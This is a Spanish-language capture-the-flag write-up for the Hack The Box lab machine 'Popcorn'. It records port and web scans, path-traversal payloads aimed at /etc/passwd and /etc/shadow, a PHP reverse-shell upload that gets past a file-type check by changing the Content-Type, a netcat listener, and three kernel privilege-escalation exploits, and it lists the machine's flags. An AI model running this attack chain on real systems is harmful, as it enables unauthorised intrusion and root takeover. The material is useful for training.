@@ -1,0 +1,609 @@
+      POPCORN 10.10.10.6
+
++++++ INFORMACION ENTREGADA:++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+	Nombre: Popcorn
+	Sistema Operativo: Linux
+	Dificultad: fácil
+	IP: 10.10.10.6
+
++++++ RECOLECION DE INFORMACION: ++++++++++++++++++++++++++++++++++++++++++++++++
+
+-- PUERTOS:
+
+	nmap -P- -Pn 10.10.10.6
+
+	nmap -sC -sV -O -p22,80 10.10.10.6 -o nmapTCP.txt
+
+	PORT   STATE    SERVICE     VERSION		
+	22/tcp open  	ssh     	OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+	|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+	80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
+	|_http-server-header: Apache/2.2.12 (Ubuntu)
+	|_http-title: Site doesn't have a title (text/html).
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	nmap -sU 10.10.10.6
+	NO UDP
+
+----- RESUMEN DE LA INFORMACION OBTENIDA:---------------------------------------
+
+	Puerto 25	Protocolo TCP	Servicio:ssh	Version: Openssh 5.1p1 
+	Puerto 80	Protocolo TCP	Servicio:http 	Version:  Apache 2.2.12 (Ubuntu)
+
+
++++++ FASE DE ANALISIS DE VULNERAVILIDADES: ++++++++++++++++++++++++++++++++++++
+
+
+----- SSH: Conexion SSH por el puerto 22 -----
+
+-- Aplicacion Nmap con script.
+
+	nmap --script=*ssh* -p22 10.10.10.6 
+
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	| ssh-auth-methods: 
+	|   Supported authentication methods: 
+	|     publickey
+	|_    password
+	| ssh-brute: 
+	|   Accounts: No valid accounts found
+	|_  Statistics: Performed 249 guesses in 603 seconds, average tps: 0.4
+	| ssh-hostkey: 
+	|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+	|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+	| ssh-publickey-acceptance: 
+	|_  Accepted Public Keys: No public keys accepted
+	|_ssh-run: Failed to specify credentials and command to run.
+	| ssh2-enum-algos: 
+	|   kex_algorithms: (4)
+	|       diffie-hellman-group-exchange-sha256
+	|       diffie-hellman-group-exchange-sha1
+	|       diffie-hellman-group14-sha1
+	|       diffie-hellman-group1-sha1
+	|   server_host_key_algorithms: (2)
+	|       ssh-rsa
+	|       ssh-dss
+	|   encryption_algorithms: (13)
+	|       aes128-cbc
+	|       3des-cbc
+	|       blowfish-cbc
+	|       cast128-cbc
+	|       arcfour128
+	|       arcfour256
+	|       arcfour
+	|       aes192-cbc
+	|       aes256-cbc
+	|       rijndael-cbc@lysator.liu.se
+	|       aes128-ctr
+	|       aes192-ctr
+	|       aes256-ctr
+	|   mac_algorithms: (7)
+	|       hmac-md5
+	|       hmac-sha1
+	|       umac-64@openssh.com
+	|       hmac-ripemd160
+	|       hmac-ripemd160@openssh.com
+	|       hmac-sha1-96
+	|       hmac-md5-96
+	|   compression_algorithms: (2)
+	|       none
+	|_      zlib@openssh.com
+
+- Buscar por internet OpenSSH 5.1p1 Debian.
+
+	No se encontró ningun exploit.
+
+- Con el comandos searchsploit, buscar por openssh:
+	# searchsploit openSSH 5.1
+	
+	No muestra nada para esta version:
+
+----- HTTP: Conexion Apache httpd 2.2.12 por el puerto 80 -----
+
+
+	Accediendo por web y muestra el mensaje de:
+		It works!
+		This is the default web page for this server.
+		The web server software is running but no content has been added, yet.It works!
+
+-- Ejecutar SCRIPT de la herramienta Nmap: 
+
+	nmap --script=*http* -p80 10.10.10.6 
+
+	PORT   STATE SERVICE
+	80/tcp open  http
+	|_http-apache-negotiation: mod_negotiation enabled.
+	| http-brute:   
+	|_  Path "/" does not require authentication
+	|_http-chrono: Request times for /; avg: 168.55ms; min: 156.49ms; max: 197.62ms
+	|_http-comments-displayer: Couldn't find any comments.
+	|_http-csrf: Couldn't find any CSRF vulnerabilities.
+	|_http-date: Fri, 01 May 2020 14:08:43 GMT; -1m43s from local time.
+	|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
+	|_http-dombased-xss: Couldn't find any DOM based XSS.
+	| http-enum: 
+	|   /test/: Test page
+	|   /test.php: Test page
+	|   /test/logon.html: Jetty
+	|_  /icons/: Potentially interesting folder w/ directory listing
+	|_http-errors: Couldn't find any error pages.
+	|_http-feed: Couldn't find any feeds.
+	|_http-fetch: Please enter the complete path of the directory to save data in.
+	| http-headers: 
+	|   Date: Fri, 01 May 2020 14:38:53 GMT
+	|   Server: Apache/2.2.12 (Ubuntu)
+	|   Last-Modified: Fri, 17 Mar 2017 17:07:05 GMT
+	|   ETag: "aa65-b1-54af035029fd5"
+	|   Accept-Ranges: bytes
+	|   Content-Length: 177
+	|   Vary: Accept-Encoding
+	|   Connection: close
+	|   Content-Type: text/html
+	|   
+	|_  (Request type: HEAD)
+	|_http-malware-host: Host appears to be clean
+	| http-methods: 
+	|_  Supported Methods: GET HEAD POST OPTIONS
+	|_http-mobileversion-checker: No mobile version detected.
+	|_http-referer-checker: Couldn't find any cross-domain scripts.
+	|_http-security-headers: 
+	|_http-server-header: Apache/2.2.12 (Ubuntu)
+	| http-sitemap-generator: 
+	|   Directory structure:
+	|     /
+	|       Other: 1
+	|   Longest directory structure:
+	|     Depth: 0
+	|     Dir: /
+	|   Total files found (by extension):
+	|_    Other: 1
+	|_http-slowloris: false
+	| http-slowloris-check: 
+	|   VULNERABLE:
+	|   Slowloris DOS attack
+	|     State: LIKELY VULNERABLE
+	|     IDs:  CVE:CVE-2007-6750
+	|       Slowloris tries to keep many connections to the target web server open and hold
+	|       them open as long as possible.  It accomplishes this by opening connections to
+	|       the target web server and sending a partial request. By doing so, it starves
+	|       the http server's resources causing Denial Of Service.
+	|       
+	|     Disclosure date: 2009-09-17
+	|     References:
+	|       http://ha.ckers.org/slowloris/
+	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+	|_http-title: Site doesn't have a title (text/html).
+	| http-traceroute: 
+	|_  Possible reverse proxy detected.
+	| http-useragent-tester: 
+	|   Status for browser useragent: 200
+	|   Allowed User Agents: 
+	|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+	|     libwww
+	|     lwp-trivial
+	|     libcurl-agent/1.0
+	|     PHP/
+	|     Python-urllib/2.5
+	|     GT::WWW
+	|     Snoopy
+	|     MFC_Tear_Sample
+	|     HTTP::Lite
+	|     PHPCrawl
+	|     URI::Fetch
+	|     Zend_Http_Client
+	|     http client
+	|     PECL::HTTP
+	|     Wget/1.13.4 (linux-gnu)
+	|_    WWW-Mechanize/1.34
+	| http-vhosts: 
+	|_127 names had status 200
+	| http-vuln-cve2011-3192: 
+	|   VULNERABLE:
+	|   Apache byterange filter DoS
+	|     State: VULNERABLE
+	|     IDs:  CVE:CVE-2011-3192  BID:49303
+	|       The Apache web server is vulnerable to a denial of service attack when numerous
+	|       overlapping byte ranges are requested.
+	|     Disclosure date: 2011-08-19
+	|     References:
+	|       https://www.tenable.com/plugins/nessus/55976
+	|       https://www.securityfocus.com/bid/49303
+	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+	|_      https://seclists.org/fulldisclosure/2011/Aug/175
+	|_http-xssed: No previously reported XSS vuln.
+
+-- Ejecutar la aplicación NIKTO, por el puerto 80.
+
+	# Ejecutar la herramienta nikto:
+	
+	nikto -h 10.10.10.6 -p 80
+
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          10.10.10.6
+	+ Target Hostname:    10.10.10.6
+	+ Target Port:        80
+	+ Start Time:         2020-02-27 04:27:08 (GMT-5)
+	---------------------------------------------------------------------------
+	+ Server: Apache/2.2.12 (Ubuntu)
+	+ Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 13:07:05 2017
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+	+ Uncommon header 'tcn' found, with contents: list
+	+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+	+ Apache/2.2.12 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+	+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+	+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+	+ /test: Output from the phpinfo() function was found.
+	+ OSVDB-112004: /test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+	+ OSVDB-112004: /test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+	+ /test.php: Output from the phpinfo() function was found.
+	+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+	+ Scan terminated:  20 error(s) and 13 item(s) reported on remote host
+	+ End Time:           2020-02-27 04:37:31 (GMT-5) (623 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested
+
+
+Ejecutar el programa dirb en busca de directorios.
+	
+	dirb http://10.10.10.6/ -w
+
+	+ http://10.10.10.6/cgi-bin/         -> Muestra el siguiente error: You don't have permission to access /cgi-bin/ on this server.
+	+ http://10.10.10.6/index            -> Muestra el siguiente error: You don't have permission to access /index on this server.
+	+ http://10.10.10.6/index.html       -> Muestra el siguiente error: You don't have permission to access /index.html on this server.
+	http://10.10.10.6/server-status      -> Muestra el siguiente error: You don't have permission to access /server-status on this server.
+	http://10.10.10.6/test 		     -> Muestra el contenido del fichero test con la imformacion de version y configuracion de servicio apache
+	http://10.10.10.6/torrent/           -> Pagina de inicio del aplicativo web  torrnet home
+	---- Entering directory: http://10.10.10.6/torrent/ ----
+
+	---- Entering directory: http://10.10.10.6/torrent/ ----
+	==> DIRECTORY: http://10.10.10.6/torrent/admin/                                                                   
+	+ http://10.10.10.6/torrent/browse (CODE:200|SIZE:9278)                                                           
+	+ http://10.10.10.6/torrent/comment (CODE:200|SIZE:936)                                                           
+	+ http://10.10.10.6/torrent/config (CODE:200|SIZE:0)                                                              
+	==> DIRECTORY: http://10.10.10.6/torrent/css/                                                                     
+	==> DIRECTORY: http://10.10.10.6/torrent/database/                                                                
+	+ http://10.10.10.6/torrent/download (CODE:200|SIZE:0)                                                            
+	+ http://10.10.10.6/torrent/edit (CODE:200|SIZE:0)                                                                
+	==> DIRECTORY: http://10.10.10.6/torrent/health/                                                                  
+	+ http://10.10.10.6/torrent/hide (CODE:200|SIZE:3765)                                                             
+	==> DIRECTORY: http://10.10.10.6/torrent/images/                                                                  
+	+ http://10.10.10.6/torrent/index (CODE:200|SIZE:11356)                                                           
+	+ http://10.10.10.6/torrent/index.php (CODE:200|SIZE:11356)                                                       
+	==> DIRECTORY: http://10.10.10.6/torrent/js/                                                                      
+	==> DIRECTORY: http://10.10.10.6/torrent/lib/                                                                     
+	+ http://10.10.10.6/torrent/login (CODE:200|SIZE:8367)                                                            
+	+ http://10.10.10.6/torrent/logout (CODE:200|SIZE:182)                                                            
+	+ http://10.10.10.6/torrent/preview (CODE:200|SIZE:28104)                                                         
+	==> DIRECTORY: http://10.10.10.6/torrent/readme/                                                                  
+	+ http://10.10.10.6/torrent/rss (CODE:200|SIZE:964)                                                               
+	+ http://10.10.10.6/torrent/secure (CODE:200|SIZE:4)                                                              
+	+ http://10.10.10.6/torrent/stylesheet (CODE:200|SIZE:321)                                                        
+	==> DIRECTORY: http://10.10.10.6/torrent/templates/                                                               
+	+ http://10.10.10.6/torrent/thumbnail (CODE:200|SIZE:1789)                                                        
+	==> DIRECTORY: http://10.10.10.6/torrent/torrents/                                                                
+	==> DIRECTORY: http://10.10.10.6/torrent/upload/                                                                  
+	+ http://10.10.10.6/torrent/upload_file (CODE:200|SIZE:0)                                                         
+	==> DIRECTORY: http://10.10.10.6/torrent/users/    
+
+	---- Entering directory: http://10.10.10.6/torrent/admin/ ----
+	+ http://10.10.10.6/torrent/admin/admin (CODE:200|SIZE:2988)                                                      
+	+ http://10.10.10.6/torrent/admin/admin.php (CODE:200|SIZE:2988)       
+
+	==> DIRECTORY: http://10.10.10.6/torrent/admin/images/                                                            
+	+ http://10.10.10.6/torrent/admin/index (CODE:200|SIZE:80)                                                        
+	+ http://10.10.10.6/torrent/admin/index.php (CODE:200|SIZE:80)                                                    
+	==> DIRECTORY: http://10.10.10.6/torrent/admin/templates/                                                         
+	+ http://10.10.10.6/torrent/admin/users (CODE:200|SIZE:80)   
+
+	---- Entering directory: http://10.10.10.6/torrent/css/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/css/lightbox (CODE:200|SIZE:2054)                                                     
+																													  
+	---- Entering directory: http://10.10.10.6/torrent/database/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+
+	---- Entering directory: http://10.10.10.6/torrent/health/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/health/1 (CODE:200|SIZE:106)                                                          
+	+ http://10.10.10.6/torrent/health/2 (CODE:200|SIZE:112)                                                          
+	+ http://10.10.10.6/torrent/health/3 (CODE:200|SIZE:118)                                                          
+	+ http://10.10.10.6/torrent/health/4 (CODE:200|SIZE:120)                                                          
+	+ http://10.10.10.6/torrent/health/5 (CODE:200|SIZE:125)                                                          
+																													  
+	---- Entering directory: http://10.10.10.6/torrent/images/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/images/admin (CODE:200|SIZE:32762)                                                    
+	+ http://10.10.10.6/torrent/images/back (CODE:200|SIZE:1385)                                                      
+	+ http://10.10.10.6/torrent/images/background (CODE:200|SIZE:81)                                                  
+	+ http://10.10.10.6/torrent/images/banner (CODE:200|SIZE:19213)                                                   
+	+ http://10.10.10.6/torrent/images/blank (CODE:200|SIZE:43)                                                       
+	+ http://10.10.10.6/torrent/images/button (CODE:200|SIZE:30884)                                                   
+	+ http://10.10.10.6/torrent/images/close (CODE:200|SIZE:222)                                                      
+	+ http://10.10.10.6/torrent/images/details (CODE:200|SIZE:925)                                                    
+	+ http://10.10.10.6/torrent/images/download (CODE:200|SIZE:1081)                                                  
+	+ http://10.10.10.6/torrent/images/edit (CODE:200|SIZE:2986)                                                      
+	+ http://10.10.10.6/torrent/images/feed (CODE:200|SIZE:917)                                                       
+	+ http://10.10.10.6/torrent/images/folder (CODE:200|SIZE:969)                                                     
+	+ http://10.10.10.6/torrent/images/loading (CODE:200|SIZE:2767)                                                   
+	+ http://10.10.10.6/torrent/images/login (CODE:200|SIZE:31910)                                                    
+	+ http://10.10.10.6/torrent/images/logo (CODE:200|SIZE:4663)                                                      
+	+ http://10.10.10.6/torrent/images/logout (CODE:200|SIZE:33238)                                                   
+	+ http://10.10.10.6/torrent/images/reg (CODE:200|SIZE:51)                                                         
+	+ http://10.10.10.6/torrent/images/register (CODE:200|SIZE:33698)                                                 
+	+ http://10.10.10.6/torrent/images/search (CODE:200|SIZE:1524)                                                    
+	+ http://10.10.10.6/torrent/images/stats (CODE:200|SIZE:12957)                                                    
+	+ http://10.10.10.6/torrent/images/th (CODE:200|SIZE:1164) 
+
+	---- Entering directory: http://10.10.10.6/torrent/js/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/js/lightbox (CODE:200|SIZE:20711)                                                     
+																													  
+	---- Entering directory: http://10.10.10.6/torrent/lib/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+																													  
+	---- Entering directory: http://10.10.10.6/torrent/readme/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/readme/license (CODE:200|SIZE:12333)                                                  
+	+ http://10.10.10.6/torrent/readme/readme (CODE:200|SIZE:3412)                                                    
+																													  
+	---- Entering directory: http://10.10.10.6/torrent/templates/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+	+ http://10.10.10.6/torrent/templates/about (CODE:200|SIZE:850)                                                   
+	+ http://10.10.10.6/torrent/templates/directory (CODE:200|SIZE:247)                                               
+	==> DIRECTORY: http://10.10.10.6/torrent/templates/email/                                                         
+	+ http://10.10.10.6/torrent/templates/faq (CODE:200|SIZE:3690)                                                    
+	+ http://10.10.10.6/torrent/templates/footer (CODE:302|SIZE:0)                                                    
+	+ http://10.10.10.6/torrent/templates/hack (CODE:200|SIZE:120)                                                    
+	+ http://10.10.10.6/torrent/templates/header (CODE:200|SIZE:143)                                                  
+	+ http://10.10.10.6/torrent/templates/layout (CODE:200|SIZE:5205)                                                 
+	+ http://10.10.10.6/torrent/templates/modify (CODE:302|SIZE:0)                                                    
+	+ http://10.10.10.6/torrent/templates/news (CODE:200|SIZE:144)                                                    
+	+ http://10.10.10.6/torrent/templates/stats (CODE:200|SIZE:143) 
+
+	---- Entering directory: http://10.10.10.6/torrent/templates/email/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+
+	---- Entering directory: http://10.10.10.6/torrent/users/templates/ ----
+	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+		(Use mode '-w' if you want to scan it anyway)
+
+-- Ejecutar el progama Wfuzz:
+
+	wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 404 http://10.10.10.6/FUZZ > wfuzz-ALL_attack.txt
+
+	********************************************************
+	* Wfuzz 2.4.5 - The Web Fuzzer                         *
+	********************************************************
+
+	Target: http://10.10.10.6/FUZZ
+	Total requests: 468
+
+	===================================================================
+	ID           Response   Lines    Word     Chars       Payload                                                                                                                                  
+	===================================================================
+
+	000000039:   400        10 L     35 W     302 Ch      "\nnetstat -a%\n"                                                                                                                        
+	000000055:   200        4 L      25 W     177 Ch      "?x=""                                                                                                                                   
+	000000054:   200        4 L      25 W     177 Ch      "?x="                                                                                                                                    
+	000000056:   200        4 L      25 W     177 Ch      "?x=|"                                                                                                                                   
+	000000057:   200        4 L      25 W     177 Ch      "?x=>"                                                                                                                                   
+	000000062:   400        10 L     35 W     302 Ch      "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|"                                                                      
+	000000064:   400        10 L     35 W     302 Ch      "../../../../../../../../../../../../etc/hosts"                                                                                          
+	000000065:   400        10 L     35 W     302 Ch      "../../boot.ini"                                                                                                                         
+	000000068:   400        10 L     35 W     302 Ch      "../../../../../../../../../../../../etc/passwd"                                                                                         
+	000000070:   400        10 L     35 W     302 Ch      "../../../../../../../../../../../../etc/shadow"                                                                                         
+	000000071:   400        10 L     35 W     302 Ch      "/../../../../../../../../../../etc/passwd^^"                                                                                            
+	000000074:   400        10 L     35 W     302 Ch      "/../../../../../../../../../../etc/shadow"                                                                                              
+	000000072:   400        10 L     35 W     302 Ch      "/../../../../../../../../../../etc/shadow^^"                                                                                            
+	000000073:   400        10 L     35 W     302 Ch      "/../../../../../../../../../../etc/passwd"                                                                                              
+	000000099:   400        10 L     35 W     302 Ch      "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+-- Ejecutar el progama searchsploit
+	searchsploit "torrent hoster"
+	--------------------------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                                         |  Path
+																						   | (/usr/share/exploitdb/)
+	--------------------------------------------------------------------------------------- ----------------------------------------
+	Torrent Hoster - Remount Upload                                                        | exploits/php/webapps/11746.txt
+	--------------------------------------------------------------------------------------- ----------------------------------------
+	(No fuciona)
+
+
+
++++++ FASE DE EXPLOTACION ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Con los datos del script de nmap, se encuentran 2 vulnerabilidades que indican:
+	- CVE-2007-6750 --> No encontre para explotarlo.
+	
+	
+	- CVE-2011-3192 --> Encuentre la siguiente web:
+	https://www.exploit-db.com/exploits/18221
+	
+	Descargar el exploit y compilar:
+	gcc -Wall -pthread -o rcvalle-rapache 18221.c
+	Ejecutar ./rcvalle-rapache 10.10.10.6
+	(No se consigue nada)
+	
+	Otra web que encuentra:
+	https://www.exploit-db.com/exploits/17696
+	Si requiere alguna libreria, instalar:
+	cpan Parallel::ForkManager
+	(No se consigue nada)
+
+Con los datos de nikto, compruebar las 2 vulnerabilidades que indica.
+	- Exploit para apache 2.2.12  (CVE-2014-6271) 
+	(No funciona)
+
+	- Exploit para apache 2.2.12  (CVE-2014-6278) 
+	Fichero: shell_shocker.py
+	Fuente: https://github.com/mubix/shellshocker-pocs/blob/master/shell_shocker.py
+
+	Procedimiento:
+	1.	Descargar el fichero Shell_shocker.py del link anterior.
+	2.	Ir al directorio donde está el fichero.
+	3.	Dar permisos al fichero:  chmod +x Shell_shocker.py
+	4.	El programa se ejecuta:    python shell_shocker.py http://10.10.10.6/test
+	(NO FUNCIONA)
+
+//////////////////////////// OPCION 1 ////////////////////////////////////////////
+
+	- Con los datos de dirb, comprobar que hay muchos directorios y ficheros.
+
+	Después de comprobar la web Torrent Hoster, confirmar que es la version 2.0 
+	Para poder acceder, dar de alta con un usuario y una contraseña.
+
+	Tiene una opción de subir ficheros, comprobar que se puede subir ficheros .torrent.
+	Por lo que descargar un fichero torrent y en la direccion web http://10.10.10.6/torrent/torrents.php?mode=upload
+
+	Seleccionar Browser y seleccionar el torrent, cumplimentar los demás datos y dar a "Upload Torrent".
+	Después de unos minutos nos confirma que se ha subido el fichero.
+
+	Al confirmar que nos deja subir fichero buscar un código de  reverse shell para php, (Se comprueba y no funciona).
+
+	Probar con uno de netcat. Por lo que se debe crear un fichero nombre.php.png con ese codigo (el codigo utilizado es de la web
+	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet ).
+	*En Kali también hay un fichero que hace lo mismo en /usr/share/laudanum/php/php-reverse-shell.php (modificar el nombre a subir.php.jpg)
+	Dentro de este fichero hay que sustituir la ip que viene por la nuestra, quedando así: $ ip = '10.10.12.14' //CHANGE THIS.
+	
+	Pulsar el Browser y seleccionar el fichero anterior, pulsar "Submit  Screenshot".
+	Ir al directorio donde estan lo ficheros y no reconoce el fichero.
+
+	Configurar el navegador con proxy manual a la IP 127.0.0.1
+	Con Burpsuit, vuelver a realizar y capturar el envió.
+	En la ventana donde subimos el torrent, seleccionar "Edit torrent"
+	Insertar el fichero anterior, pero terminado solo en php, fichero.php.
+	iniciamos Bursuit la captura. En Proxy -> Intercept -> Intercept es on (tiene que estar).
+
+	En otra consola ejecutar:
+	 nc -lvnp 2323
+	
+	*Si lo hacemos con el fichero subir.php.jpg hay que lanzar un nc -lvnp 8888
+	
+	Pulsar en la ventana donde vamos a subir el fichero "Submit screenshot".
+
+	El resultado , seleccionar action y enviar a Repeater.
+	Confimar que el tipo no es valido que lo envia como Content-Type: application/x-php . Modificar por Content-Type: image/png y pulsar "Send".
+	Lo admite.
+	
+	Quitar la configuracion proxy manual.
+	Confirmar que ha subido el fichero en la direccion http://10.10.10.6/torrent/upload/
+	Pulsar doble clic sobre el fichero subido.
+	CONSEGUIMOS UNA SHELL, como usuario www-data.
+	
+	Para mejorar la shell ejecutar.
+	export TERM=screen
+
+-- ELEVAR PRIVILEGIOS opcion 1 ------------------------------------------------------
+
+	- Comandos para ser administrador.
+	sudo su
+	sudo -l
+	(No funciona)
+	
+	Leer los ficheros /etc/passwd y /etc/shadow (el shadow no tengo permisos).
+
+	+Buscar la versión del kernel para buscar alguna vulnerabilidad para elevar privilegios.
+	ww-data@popcorn:/home/george$ uname -a
+	uname -a
+	Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+
+
+	-- Buscar con searchsploit kernel 2.6.31
+	Me encuentra los siguiente:
+	Linux Kernel 2.6.0 < 2.6.31 - 'pipe.c' Local Privilege Escalation (1)                | exploits/linux/local/33321.c
+	Linux Kernel 2.6.10 < 2.6.31.5 - 'pipe.c' Local Privilege Escalation                 | exploits/linux/local/40812.c
+	Linux Kernel 2.6.31 - 'perf_counter_open()' Local Buffer Overflow                    | exploits/linux/dos/33228.txt
+	Linux Kernel 2.6.31-rc5 - sigaltstack 4-Byte Stack Disclosure                        | exploits/linux/local/9352.c
+	Linux Kernel 2.6.31-rc7 - 'AF_LLC getsockname' 5-Byte Stack Disclosure               | exploits/linux/local/9513.c
+	Linux Kernel 2.6.31.4 - 'unix_stream_connect()' Local Denial of Service              | exploits/linux/dos/10022.c
+	Linux Kernel < 2.6.31-rc4 - 'nfs4_proc_lock()' Denial of Service                     | exploits/linux/dos/10202.c
+	Linux Kernel < 2.6.31-rc7 - 'AF_IRDA' 29-Byte Stack Disclosure (2)
+
+	Probar Linux Kernel 2.6.0 < 2.6.31 - 'pipe.c' Local Privilege Escalation (1) 
+	(No funciona)
+
+	Probar Linux Kernel 2.6.10 < 2.6.31.5 - 'pipe.c' Local Privilege Escalation 
+	(No funciona)
+
+	Buscar en google, por la version del kernel. 2.6.31-14-generic-pae 
+
+	Se localiza esta web: https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson
+
+	- Para enviar ficheros ejecutar:
+
+	EN KALI
+	python -m SimpleHTTPServer 3232
+
+	python3 -m http.server 3131
+
+	Descargar el fichero full-nelson.c y enviar a la maquina Popcorn.
+	Compilar: gcc full-nelson.c -o full-nelson
+	Dar permisos: chmod +x full-nelson
+	Ejecutar: ./full-nelson
+
+	Se consigue elevar privilegios de root.
+	whoami
+	root
+
+-- ELEVAR PRIVILEGIOS opcion 2 ------------------------------------------------------
+
+	Mediante la versión de Ubuntu 9. Hay una vulnerabilidad.
+	Descargar el exploit de la siguiente web:
+	wget https://www.exploit-db.com/exploits/14339/ -o exploit.sh
+	
+	Decodificar.
+	dos2unix exploit.sh
+	
+	Subir como en la opcion 1 mediante un servidor de python.
+	Dar permisos chmod +x exploit.sh
+	Ejecutar ./exploit.sh
+	
+	Se consigue elevar privilegios de root.
+	whoami
+	root
+
+-- ELEVAR PRIVILEGIOS opcion 3 ------------------------------------------------------
+	
+	Buscar en google, por la version del kernel. 2.6.31-14-generic-pae 
+	En esta web: https://www.exploit-db.com/exploits/40839
+
+	Descargar el exploit y compilar.
+	gcc -pthread 40839.c -o dirty -lcrypt
+	Ejecutar ./dirty
+	
+	Nos muestra que tenemos acceso por ssh firefat@10.10.10.6
+	usuario  firefart
+	contraseña Password
+	
+	Se consique elevar privilegios de root.
+	whoami
+	root
+	
+
+
++++++ FASE DE POSTEXPLOTACION ++++++++++++++++++++++++++++++++++++
+
+	FLAG USUARIO:
+	$ cat /home/george/user.txt
+	5e36a919398ecc5d5c110f2d865cf136
+
+	FLAG ROOT:
+	$ cat /root/root.txt
+	f122331023a9393319a0370129fd9b14
